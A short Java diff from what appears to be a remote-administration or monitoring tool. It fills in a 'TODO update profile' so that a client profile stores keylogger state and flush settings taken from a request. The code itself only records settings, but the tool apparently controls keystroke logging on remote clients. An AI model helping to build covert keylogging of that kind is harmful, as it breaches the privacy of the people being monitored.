@@ -567,7 +567,16 @@ public enum ViewerCommands {
 				outcome.setResult(false).setComment("Request timed out");
 			} else {
 				if (m.getRsChangeSetting().getResult().getResult()) {
-					// TODO update profile
+					// update profile
+					if (rq.hasKeyloggerState()) {
+						ViewerStore.Profiles.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
+					}
+					if (rq.hasFlushMethod()) {
+						ViewerStore.Profiles.getClient(cid).setFlushMethod(rq.getFlushMethod());
+					}
+					if (rq.hasFlushValue()) {
+						ViewerStore.Profiles.getClient(cid).setFlushValue(rq.getFlushValue());
+					}
 				}
 				return m.getRsChangeSetting().getResult();
 			}
